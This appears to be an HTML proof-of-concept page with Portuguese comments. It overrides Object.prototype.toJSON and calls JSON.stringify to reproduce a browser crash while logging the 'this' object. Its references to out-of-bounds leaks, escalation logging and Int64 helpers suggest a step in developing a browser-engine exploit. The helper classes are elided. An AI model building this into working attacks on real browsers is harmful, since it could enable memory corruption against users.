<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC Isolado v2.3j - Capturando 'this' antes de Object.keys()</title>
    <style> /* ... estilos como antes ... */ </style>
</head>
<body>
    <h1>PoC Isolado v2.3j - Capturando 'this' antes de Object.keys()</h1>
    <p>Tenta logar 'this' no console imediatamente antes de Object.keys(this) que causa o crash.</p>
    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3j</button>
    <div id="output"></div>

    <script>
        // AdvancedInt64 e generalUtils como antes...
        class AdvancedInt64 { /* ... (código completo como antes) ... */ }
        const generalUtils = { /* ... (código completo como antes) ... */ };

        const outputDivS1 = document.getElementById('output');
        const runBtn = document.getElementById('runBtn');    
        const MEDIUM_PAUSE_S1 = 200;

        const logS1 = (message, type = 'info', funcName = '') => {
            // Log primário no console do navegador, pois é mais rápido
            console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
            // Log secundário na div
            const targetDiv = document.getElementById('output');
            if (targetDiv) {
                try {
                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
                    const prefix = funcName ? `[${funcName}] ` : '';
                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
                    if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; }
                    targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                    targetDiv.scrollTop = targetDiv.scrollHeight;
                } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }
            }
        };

        const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
        
        // Objeto de teste original do PoC v2.3 que travava
        const originalTestObject_j = { a: 1, b: 'test_data', c: { nested: true, d: "deep_val" } };
        let callCount_toJSON_j = 0;

        const testPPJsonHijack_v23j = async () => {
            const FNAME = 'testPPJsonHijack_v23j';
            logS1("--- Iniciando Teste v2.3j: Capturando 'this' antes de Object.keys ---", 'test', FNAME);
            
            const ppKey = 'toJSON'; 
            let originalToJSON_Descriptor_j;
            let ppAppliedSuccessfully_j = false;
            callCount_toJSON_j = 0;

            try {
                originalToJSON_Descriptor_j = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                logS1("Descrição original de toJSON obtida.", 'info', FNAME);

                Object.prototype[ppKey] = function() { 
                    callCount_toJSON_j++;
                    let logPrefix = `toJSON PoC v2.3j (Chamada ${callCount_toJSON_j})`;
                    
                    // Log Intensivo e Imediato no CONSOLE antes de Object.keys(this)
                    console.log(`%c${logPrefix} - PREstes a chamar Object.keys(this)!`, 'color: red; font-weight: bold;');
                    console.log(`%c   ${logPrefix} - typeof this: ${typeof this}`, 'color: red;');
                    if (this === null) {
                        console.log(`%c   ${logPrefix} - this é NULL`, 'color: red;');
                    } else {
                        console.log(`%c   ${logPrefix} - this.constructor.name: ${this.constructor ? this.constructor.name : 'N/A'}`, 'color: red;');
                        if (this === originalTestObject_j) console.log(`%c   ${logPrefix} - this É o objeto RAIZ`, 'color: red;');
                        else if (this === originalTestObject_j.c) console.log(`%c   ${logPrefix} - this É o objeto ANINHADO 'c'`, 'color: red;');
                        // Tentar inspecionar o objeto 'this' diretamente no console ANTES do Object.keys
                        console.log(`%c   ${logPrefix} - Inspecionando 'this' diretamente:`, 'color: blue; font-weight: bold;');
                        console.dir(this); // Tenta logar o objeto de forma interativa no console
                    }
                    // Fim do Log Intensivo

                    let keys = [];
                    try {
                        // A LINHA CRÍTICA QUE CAUSA O CRASH ORIGINAL
                        keys = Object.keys(this); 
                        logS1(`${logPrefix} - SUCESSO: Object.keys(this) retornou [${keys.join(', ')}]`, 'good', FNAME); // Este logS1 pode não aparecer se travar
                        console.log(`${logPrefix} - SUCESSO Object.keys(this). Chaves:`, keys);
                        return { "toJSON_called_successfully_v23j": true, "object_keys": keys }; 
                    } catch (e) {
                        logS1(`${logPrefix} - ERRO em Object.keys(this): ${e.message}.`, 'error', FNAME); // Este logS1 pode não aparecer
                        console.error(`${logPrefix} - ERRO em Object.keys(this):`, e);
                        return { "toJSON_error_getting_keys_v23j": true, "error_message": String(e.message) };
                    }
                };
                ppAppliedSuccessfully_j = true;
                logS1("Poluição Object.prototype.toJSON APLICADA (com Object.keys).", 'good', FNAME);

                logS1("Tentando JSON.stringify com originalTestObject_j... (CRASH ESPERADO AQUI)", 'critical', FNAME);
                const result_j = JSON.stringify(originalTestObject_j); 
                
                // Se chegar aqui, não travou como no PoC v2.3 original
                logS1(`JSON.stringify CONCLUÍDO (inesperado!). Resultado: ${result_j ? String(result_j).substring(0,500) : "N/A"}`, 'warn', FNAME);

            } catch (e) {
                logS1(`Erro fatal capturado em testPPJsonHijack_v23j: ${e.message}`, 'error', FNAME);
                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', FNAME);
                console.error("JSON.stringify Crash Test Error (v2.3j):", e);
            } finally {
                logS1("Entrou no finally de testPPJsonHijack_v23j.", 'info', FNAME);
                if (ppAppliedSuccessfully_j) { 
                    if (originalToJSON_Descriptor_j) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_j);
                    } else if (originalToJSON_Descriptor_j === undefined && Object.prototype.hasOwnProperty(ppKey)) {
                         delete Object.prototype[ppKey];
                    }
                    logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup_v23j');
                }
            }
            logS1(`--- Teste JSON.stringify v2.3j Concluído ---`, 'test', FNAME);
        };

        const runIsolatedTest = async () => {
            if (runBtn) runBtn.disabled = true;
            const outputDiv = document.getElementById('output');
            if (outputDiv) outputDiv.innerHTML = '';
            
            console.log("%crunIsolatedTest (v2.3j) FOI CHAMADA!", "font-weight:bold; color:green;");
            logS1("==== INICIANDO PoC Isolado v2.3j (Capturando 'this' antes de Object.keys) ====", 'test', 'runIsolatedTest');
            
            await testPPJsonHijack_v23j(); // Não chama mais simulateOOBLeakAndStoreS1
            
            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
            logS1("\n==== PoC Isolado v2.3j CONCLUÍDO ====", 'test', 'runIsolatedTest');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
